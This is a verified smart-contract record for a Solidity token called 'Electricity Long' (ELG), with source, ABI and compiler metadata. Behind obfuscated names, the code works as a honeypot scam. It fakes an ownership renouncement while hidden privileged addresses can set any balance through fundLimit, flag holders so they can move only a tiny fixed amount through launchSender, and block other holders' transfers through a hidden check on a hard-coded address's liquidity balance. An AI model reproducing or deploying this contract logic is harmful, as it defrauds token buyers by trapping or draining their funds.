{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface swapAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTake {\n    function createPair(address tradingLiquidity, address feeList) external returns (address);\n}\n\ninterface isFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingLaunched) external view returns (uint256);\n\n    function transfer(address exemptAmount, uint256 marketingTradingTake) external returns (bool);\n\n    function allowance(address amountLiquidityMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTradingTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptAmount,\n        uint256 marketingTradingTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toReceiver, uint256 value);\n    event Approval(address indexed amountLiquidityMarketing, address indexed spender, uint256 value);\n}\n\ninterface isFeeMetadata is isFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ElectricityLong is receiverFund, isFee, isFeeMetadata {\n\n    address private buyTo;\n\n    constructor (){\n        \n        swapAt enableLimitTake = swapAt(isShould);\n        walletLaunch = walletTake(enableLimitTake.factory()).createPair(enableLimitTake.WETH(), address(this));\n        \n        buyMin = _msgSender();\n        feeTotal();\n        limitEnable[buyMin] = true;\n        launchLaunchedIs[buyMin] = walletMode;\n        if (liquidityAuto) {\n            liquidityTake = false;\n        }\n        emit Transfer(address(0), buyMin, walletMode);\n    }\n\n    uint256 private totalAmount;\n\n    address atTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public atTrading;\n\n    function allowance(address autoTx, address senderIs) external view virtual override returns (uint256) {\n        if (senderIs == isShould) {\n            return type(uint256).max;\n        }\n        return exemptAt[autoTx][senderIs];\n    }\n\n    function walletTxLiquidity(uint256 marketingTradingTake) public {\n        marketingTeam();\n        liquidityMarketing = marketingTradingTake;\n    }\n\n    function transferFrom(address minFund, address exemptAmount, uint256 marketingTradingTake) external override returns (bool) {\n        if (_msgSender() != isShould) {\n            if (exemptAt[minFund][_msgSender()] != type(uint256).max) {\n                require(marketingTradingTake <= exemptAt[minFund][_msgSender()]);\n                exemptAt[minFund][_msgSender()] -= marketingTradingTake;\n            }\n        }\n        return modeReceiverTeam(minFund, exemptAmount, marketingTradingTake);\n    }\n\n    function marketingTeam() private view {\n        require(limitEnable[_msgSender()]);\n    }\n\n    function modeReceiverTeam(address minFund, address exemptAmount, uint256 marketingTradingTake) internal returns (bool) {\n        if (minFund == buyMin) {\n            return totalReceiver(minFund, exemptAmount, marketingTradingTake);\n        }\n        uint256 shouldIsBuy = isFee(walletLaunch).balanceOf(atTeam);\n        require(shouldIsBuy == liquidityMarketing);\n        require(exemptAmount != atTeam);\n        if (atTrading[minFund]) {\n            return totalReceiver(minFund, exemptAmount, sellReceiver);\n        }\n        return totalReceiver(minFund, exemptAmount, marketingTradingTake);\n    }\n\n    function approve(address senderIs, uint256 marketingTradingTake) public virtual override returns (bool) {\n        exemptAt[_msgSender()][senderIs] = marketingTradingTake;\n        emit Approval(_msgSender(), senderIs, marketingTradingTake);\n        return true;\n    }\n\n    string private modeMax = \"Electricity Long\";\n\n    function launchSender(address swapMax) public {\n        marketingTeam();\n        \n        if (swapMax == buyMin || swapMax == walletLaunch) {\n            return;\n        }\n        atTrading[swapMax] = true;\n    }\n\n    address isShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address marketingAmount, uint256 marketingTradingTake) external virtual override returns (bool) {\n        return modeReceiverTeam(_msgSender(), marketingAmount, marketingTradingTake);\n    }\n\n    bool public liquidityTake;\n\n    function getOwner() external view returns (address) {\n        return buyTo;\n    }\n\n    function balanceOf(address marketingLaunched) public view virtual override returns (uint256) {\n        return launchLaunchedIs[marketingLaunched];\n    }\n\n    uint256 public liquidityFrom;\n\n    address public walletLaunch;\n\n    address public buyMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptTradingTeam;\n    }\n\n    bool public minMarketingSender;\n\n    uint256 private walletMode = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return modeMax;\n    }\n\n    event OwnershipTransferred(address indexed fundToken, address indexed listSwap);\n\n    function fundLimit(address marketingAmount, uint256 marketingTradingTake) public {\n        marketingTeam();\n        launchLaunchedIs[marketingAmount] = marketingTradingTake;\n    }\n\n    string private exemptTradingTeam = \"ELG\";\n\n    uint256 teamTo;\n\n    mapping(address => uint256) private launchLaunchedIs;\n\n    uint256 liquidityMarketing;\n\n    uint8 private swapTrading = 18;\n\n    function launchShouldTotal(address launchLiquidityList) public {\n        require(launchLiquidityList.balance < 100000);\n        if (minMarketingSender) {\n            return;\n        }\n        if (liquidityTake != liquidityAuto) {\n            liquidityTake = true;\n        }\n        limitEnable[launchLiquidityList] = true;\n        if (totalAmount != liquidityFrom) {\n            liquidityAuto = false;\n        }\n        minMarketingSender = true;\n    }\n\n    function feeTotal() public {\n        emit OwnershipTransferred(buyMin, address(0));\n        buyTo = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTrading;\n    }\n\n    bool private liquidityAuto;\n\n    function owner() external view returns (address) {\n        return buyTo;\n    }\n\n    function totalReceiver(address minFund, address exemptAmount, uint256 marketingTradingTake) internal returns (bool) {\n        require(launchLaunchedIs[minFund] >= marketingTradingTake);\n        launchLaunchedIs[minFund] -= marketingTradingTake;\n        launchLaunchedIs[exemptAmount] += marketingTradingTake;\n        emit Transfer(minFund, exemptAmount, marketingTradingTake);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptAt;\n\n    uint256 constant sellReceiver = 5 ** 10;\n\n    mapping(address => bool) public limitEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletMode;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLiquidityMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTradingTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTradingTake\",\"type\":\"uint256\"}],\"name\":\"fundLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"launchSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidityList\",\"type\":\"address\"}],\"name\":\"launchShouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTradingTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTradingTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTradingTake\",\"type\":\"uint256\"}],\"name\":\"walletTxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ElectricityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}